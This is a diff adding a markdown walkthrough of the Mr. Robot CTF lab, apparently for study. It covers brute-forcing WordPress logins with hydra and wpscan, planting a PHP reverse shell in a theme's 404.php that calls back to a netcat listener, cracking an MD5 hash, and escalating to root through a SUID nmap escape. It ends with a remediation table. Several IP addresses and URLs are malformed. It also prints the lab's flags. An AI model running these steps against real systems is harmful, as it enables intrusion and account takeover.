@@ -1,0 +1,275 @@
+# Comprehensive Educational Walkthrough: Mr. Robot CTF Lab
+A deeply detailed, step-by-step breakdown of the reconnaissance, credential exploitation, foothold generation, and privilege escalation vectors executed against the Mr. Robot vulnerable machine.
+
+---
+
+## 🛡️ Executive Summary & Core Methodology
+This document serves as an instructional guide detailing the systematic compromise of the target system. The entire lifecycle is executed across five distinct phases, using standard Linux utility structures and specialized security assessment tools. 
+
+The core learning objectives demonstrated include:
+*   File architecture enumeration and wordlist optimization.
+*   Bypassing default administrative boundaries via targeted parameter manipulation.
+*   Establishing interactive web-based remote shells and process stabilization.
+*   Cryptographic hash identification and lateral privilege migration.
+*   Identifying and exploiting vulnerable system permissions via misconfigured Set Owner User ID (`SUID`) bits.
+
+---
+
+## 🔍 Phase 1: Reconnaissance & Dictionary Optimization
+
+### 1.1 Web Index Analysis
+The initial interaction involves mapping out open pathways on the web application server (`192.168.0.28.28`). Navigating manually to the `robots.txt` file (a plain text file used to instruct search engines which paths they can or cannot index) exposes sensitive files intentionally hidden by the developer.
+
+```http
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+
+### 1.2 Command Breakdown: Downloading Assets
+To pull the target files from the remote web server onto your local Kali machine, use the non-interactive network downloader utility `wget`.
+
+```bash
+wget http://192.168.0.28
+```
+
+**Process Mechanics:**
+*   `wget`: Tells the operating system to initiate an HTTP/HTTPS or FTP connection to the specified URL and download the stream directly into your current working directory.
+*   **The Filename Typo Note:** The dictionary file is intentionally spelled `fsocity.dic` (missing the "e") as a tribute to the fictional hacker group in the series. Attempting to download `fsociety.dic` results in a `404 Not Found` error because no file exists under that string identifier.
+
+### 1.3 Command Breakdown: Wordlist Optimization
+The downloaded `fsocity.dic` file contains over 858,000 text lines. Running attacks with a file this large creates massive network latency and consumes substantial processing power. Inspection reveals that the vast majority of these lines are repetitive copies of the same words.
+
+To fix this, execute a sorting operation to strip out every duplicate:
+
+```bash
+sort -u fsocity.dic > clean.txt
+```
+
+**Process Mechanics:**
+*   `sort`: A native Linux binary that reads a file line-by-line and organizes the characters alphabetically or numerically.
+*   `-u` (Unique Flag): Instructs the sorting algorithm to evaluate every line. If a word appears multiple times, it deletes all occurrences except for one.
+*   `>` (Output Redirection Operator): Instructs the shell to intercept the text stream that would normally print onto your terminal screen and write it cleanly into a brand-new file named `clean.txt`.
+*   **Efficiency Metric:** This operation collapses the file size down to exactly **11,452 unique words**, optimizing subsequent brute-force attacks to execute in seconds.
+
+---
+### 🖼️ Phase 1 Screenshots
+![Reconnaissance & Robots.txt Output](img/phase1_recon.png)
+
+---
+
+## 🔐 Phase 2: WordPress Authentication Exploitation
+
+### 2.1 Bypassing Author Enumeration Checks
+The target runs an outdated deployment of **WordPress 4.3.1**. Normally, running an automated scan via WPScan with the user enumeration flag (`--enumerate u`) checks the site's author archives to leak active usernames. However, the creator of this machine blocked standard API scanning loops, forcing WPScan to report "No plugins found" and "No users found".
+
+To bypass this automation barrier, we must evaluate how the WordPress login form (`/wp-login.php`) handles authentication errors natively.
+
+### 2.2 Command Breakdown: Username Verification with Hydra
+We use `hydra`, a parallelized login cracker, to automate checking the login form against our `clean.txt` file. We exploit the fact that WordPress alters its error message based on input accuracy:
+*   If a username does not exist: It outputs **"Invalid username"**.
+*   If a username does exist but the password is wrong: It outputs **"The password you entered... is incorrect"**.
+
+```bash
+hydra -L ./clean.txt -p password_doesnt_matter 192.168.0.28.28 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
+```
+
+**Process Mechanics:**
+*   `-L ./clean.txt`: Directs the tool to map the `clean.txt` wordlist to the username variable. It will cycle through all 11,452 words one by one in the username column.
+*   `-p password_doesnt_matter`: Sets a static, fake filler password string. Since we are only looking for a valid username right now, the password content does not matter.
+*   `http-form-post`: Specifies the protocol module required. It tells Hydra to structure the attack as an HTTP POST request, which is how web forms transmit login credentials.
+*   `'/wp-login.php...`: The execution parameter string, broken into three specific blocks separated by colons:
+    1.  `/wp-login.php`: The specific URL path hosting the login form target.
+    2.  `log=^USER^&pwd=^PASS^&wp-submit=Log+In`: The exact data payload names expected by the WordPress login form. The placeholders `^USER^` and `^PASS^` tell Hydra exactly where to inject the words from your file.
+    3.  `:Invalid username`: The **condition string**. This tells Hydra: *"As long as you see the phrase 'Invalid username' printed on the page, the attempt failed. Keep running. The exact second that phrase disappears from a response page, stop and print that username to the terminal."*
+
+This command exposes the valid user account profile: **`elliot`**.
+
+### 2.3 Command Breakdown: Password Cracking via WPScan
+With the valid username isolated, the attack turns to resolving the password parameters using `wpscan`, a black-box vulnerability scanner customized specifically for WordPress codebases.
+
+```bash
+wpscan --url http://192.168.0.28.28/ --usernames elliot --passwords clean.txt
+```
+
+**Process Mechanics:**
+*   `--url http://192.168.0.28.28/`: Defines the target destination home directory path.
+*   `--usernames elliot`: Skips automated scanning loops and binds the password attack entirely to the single valid account profile discovered in the previous step.
+*   `--passwords clean.txt`: Feeds our unique 11,452-word dictionary into the password entry loop.
+*   **The Underlying Multicall Vector:** Behind the scenes, WPScan detects that the target web architecture supports XML-RPC (`/xmlrpc.php`). Instead of sending 11,452 separate single web requests (which causes high server overhead and triggers network bottlenecks), WPScan bundles dozens of credential attempts into individual XML-RPC multicall payload blocks. This optimizes the local network execution speed to resolve the valid credential string within seconds:
+    *   **Valid Username:** `elliot`
+    *   **Valid Password:** `ER28-0652`
+
+---
+### 🖼️ Phase 2 Screenshots
+![Hydra Username Bruteforce](img/phase2_hydra.png)
+![WPScan Password Multi-call Crack](img/phase2_wpscan.png)
+
+---
+
+## 🪟 Phase 3: Initial Foothold via Template Code Injection
+
+### 3.1 Exploiting WordPress Theme Editors
+Once authenticated through `/wp-login.php` using the cracked administrative credentials, navigating to the file management panel exposes the built-in theme editor suite located under **Appearance** -> **Editor**. This panel gives administrators direct code-level editing capabilities over site styling and structural templates.
+
+### 3.2 Infiltrating the Reverse Shell
+1. Locate the **404 Template (`404.php`)** in the template file index on the right column. This file handles page-not-found routing requests.
+2. Clear out the pre-existing PHP error configuration instructions completely.
+3. Replace them with a customized variation of a standard **PHP Reverse Shell** script (located natively inside your Kali operating system filesystem at `/usr/share/webshells/php/php-reverse-shell.php`).
+4. Modify the core networking variables within the script syntax to point directly back to your attacker instance:
+   ```php
+   $ip = '192.168.0.28.21';  // Your Kali Machine Local IP Address
+   $port = 4444;          // The Local Port Dedicated to Catching the Stream
+   ```
+5. Click **Update File** to execute the physical write sequence to disk on the target server.
+
+### 3.3 Command Breakdown: Setting Up the Netcat Listener
+Before forcing the web server to execute the injected PHP code, a connection terminal listener must be opened on your local machine to catch the inbound socket request.
+
+```bash
+nc -lvnp 4444
+```
+
+**Process Mechanics:**
+*   `nc` (Netcat): A networking utility tool used to read from and write data across raw TCP and UDP network connections.
+*   `-l` (Listen Mode): Instructs Netcat to act as a local server waiting for inbound connections, rather than initiating an outbound connection to another device.
+*   `-v` (Verbose Mode): Increases console output detail, printing messages to inform you when a device makes a physical handshake with your port.
+*   `-n` (Numeric-Only): Disables DNS domain name resolution lookups. This stops Netcat from querying network routers to find hostnames, making the connection handshake execute instantly.
+*   `-p 4444` (Port Specification): Explicitly binds the local listening profile to port 4444.
+
+### 3.4 Execution Handshake
+With your terminal actively listening, open your web browser and navigate directly to the modified template asset directory location:
+```text
+http://192.168.0.28
+```
+The browser page will look like it is hanging or loading indefinitely. This is normal behavior because the web server is currently running your reverse shell script, transferring control of its process shell straight to your Netcat listener. Checking your listening terminal exposes an active terminal stream logged in as user `daemon`.
+
+---
+### 🖼️ Phase 3 Screenshots
+![WordPress 404.php Code Injection](img/phase3_editor.png)
+![Netcat Shell Capture](img/phase3_shell.png)
+
+---
+
+## 🚀 Phase 4: Horizontal Privilege Escalation (User Pivot)
+
+### 4.1 Command Breakdown: Upgrading to an Interactive PTY Shell
+The raw shell session captured by Netcat is a basic non-interactive `/bin/sh` process wrapper. It lacks typical terminal functionality: there is no tab autocompletion, no command history tracking, no visual prompt headers, and running an interactive tool like `su` or `nano` will crash the shell completely.
+
+To fix this and upgrade the terminal, invoke a pseudo-terminal emulation screen (`pty`) via Python:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+**Process Mechanics:**
+*   `python`: Invokes the target system's native Python programming interpreter environment.
+*   `-c` (Command Flag): Tells Python that the instructions are not coming from an external `.py` file, but are written directly inside the inline single quotes.
+*   `import pty;`: Loads the internal Python module responsible for handling pseudo-terminal devices, allowing the OS to emulate a real terminal hardware interface.
+*   `pty.spawn("/bin/bash")`: Spawns a new interactive Bourne-Again Shell (`/bin/bash`) sub-process, attaching it neatly to your Netcat terminal window. This creates a fully interactive prompt header (`daemon@linux:/$`).
+
+### 4.2 Local File System Discovery
+Navigating to the default home management folder (`cd /home`) maps a single profile workspace directory named `/home/robot`. Reviewing the detailed list properties (`ls -l`) reveals two target assets:
+
+```bash
+daemon@linux:/home/robot$ ls -l
+-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
+```
+
+**Permission Matrix Evaluation:**
+*   `key-2-of-3.txt` shows `-r--------`. This means **only** the file owner (`robot`) has read access. Attempting to view it as your current `daemon` session returns a *Permission Denied* error.
+*   `password.raw-md5` shows `-rw-r--r--`. The trailing `r--` pattern indicates the asset grants world-readable access. Any user on the operating system can safely read it.
+
+### 4.3 Resolving Credentials
+Executing `cat password.raw-md5` leaks the following string configuration line:
+```text
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+The value following the colon is a classic 32-character **MD5 (Message-Digest Algorithm 5)** cryptographic signature hash. Because it lacks a unique cryptographic salt, it can be easily reversed using pre-computed dictionary datasets or lookup tables (rainbow tables). 
+
+Passing `c3fcd3d76192e4007dfb496cca67e13b` through an extraction map database uncovers the plain-text password array instantly:
+*   **Decoded Plaintext:** `abcdefghijklmnopqrstuvwxyz`
+
+### 4.4 Pivoting Identities
+With the plain-text credentials recovered, invoke the standard switch user binary utility to pivot out of the unprivileged application footprint:
+
+```bash
+su robot
+```
+Type or paste the extracted alphabet string when prompted for the password. The shell prompt refreshes to read `robot@linux:~$`, granting full ownership permissions to read the second flag directly:
+
+```bash
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+---
+### 🖼️ Phase 4 Screenshots
+![Extracting MD5 Hash](img/phase4_hash.png)
+![Switching to Robot User and Flag 2](img/phase4_flag2.png)
+
+---
+
+## 👑 Phase 5: Vertical Privilege Escalation (Full Root Takeover)
+
+### 5.1 Command Breakdown: Auditing Insecure SUID Binary States
+The final phase requires escalating system privileges from the intermediate `robot` profile to full administrative `root` status. To uncover a path forward, audit the kernel tree for files with the **SUID (Set User ID)** permission flag activated.
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+**Process Mechanics:**
+*   `find`: Initiates a comprehensive filesystem search operation sequence.
+*   `/`: Tells the search utility to begin scanning from the absolute root directory of the hard drive, covering every folder recursively.
+*   `-perm -4000`: Specifies the exact permissions filter to match. The number `4000` tells the engine to look specifically for files that have the SUID bit active. When an SUID binary runs, it executes with the permissions of the file owner (which is usually `root`) rather than the permissions of the user typing the command.
+*   `-type f`: Restricts search output to display physical files only, stripping out directories or network symlink components.
+*   `2>/dev/null` (Standard Error Redirection): A critical addition for terminal readability. In Linux, file descriptor `2` represents the Standard Error (`stderr`) output stream. As an intermediate user, checking directories like `/root` triggers hundreds of "Permission Denied" lines. Redirecting descriptor `2` straight to `/dev/null` (the operating system's virtual trash container) discards those access logs entirely, ensuring only successful file matches appear on your screen.
+
+The output reveals an atypical system configuration profile link: **`/usr/local/bin/nmap`**.
+
+### 5.2 Exploit Execution Strategy: SUID Nmap Interactive Escape
+Checking the system profile configuration registers that the local target environment runs **Nmap version 3.81**. 
+
+Legacy distributions of Nmap compiled prior to version 5.21 include a built-in debugging workspace called **Interactive Mode**. Because this specific binary has the SUID bit enabled, launching the program spins up an instance running with full root system privileges.
+
+1. Launch the interactive sub-shell controller console platform:
+   ```bash
+   nmap --interactive
+   ```
+   The terminal line refreshes to show an isolated command line interface line prompt: `nmap> `.
+2. Escape out of the program interface constraints by running an explicit system shell call. In Nmap interactive mode, prefixing any string entry with an exclamation mark (`!`) instructs the software to pass that string directly to the host operating system to execute as a system command:
+   ```text
+   nmap> !sh
+   ```
+3. Because the parent Nmap program was executing with root rights due to its SUID configuration, the shell spawned by the escape command (`!sh`) inherits those identical permissions. The console prompt changes to a simple `#` symbol header.
+
+Verify your access level and read the final hidden flag file inside the root administrator's private profile space:
+
+```bash
+# whoami
+root
+# cd /root
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+---
+### 🖼️ Phase 5 Screenshots
+![SUID Find Binary Scan](img/phase5_suid.png)
+![Nmap Privilege Escalation to Root](img/phase5_root.png)
+
+---
+
+## 🛠️ Defensive Remediation Matrix
+
+To protect real-world systems against this exact chain of exploitation, apply the following mitigation strategies:
+
+| Vector Target | Identified Flaw | Remediation Action |
+| :--- | :--- | :--- |
+| **Information Security** | Critical wordlists (`fsocity.dic`) and flag tracking files exposed openly within public web directory trees. | Remove diagnostic reference assets entirely from public-facing storage roots. Implement rigid access controls on staging environments. |
+| **Platform Management** | Obsolete deployment of WordPress Core (v4.3.1) vulnerable to username enumeration exploits. | Upgrade to current stable platform releases. Enforce strict web application firewall (`WAF`) rule configurations to block cross-site scripting inputs. |
+| **Authentication Protection** | Core API paths (`/xmlrpc.php`) exposed without connection throttling limits, allowing rapid brute-forcing. | Explicitly disable the XML-RPC protocol layer within `wp-config.php` or block inbound access to the file via `.htaccess` server rules. |
+| **Credential Storage** | Storage of a legacy unsalted MD5 configuration profile string (`password.raw-md5`). | Transition legacy database stores to modern, heavily salted cryptographic standards such as `bcrypt` or `Argon2id`. |
+| **System Permissions** | Outdated utility executable files (`nmap` v3.81) assigned dangerous SUID privileges. | Enforce the Principle of Least Privilege. Regularly audit SUID states. Never assign SUID bit permissions to any tool that supports external shell escapes. |
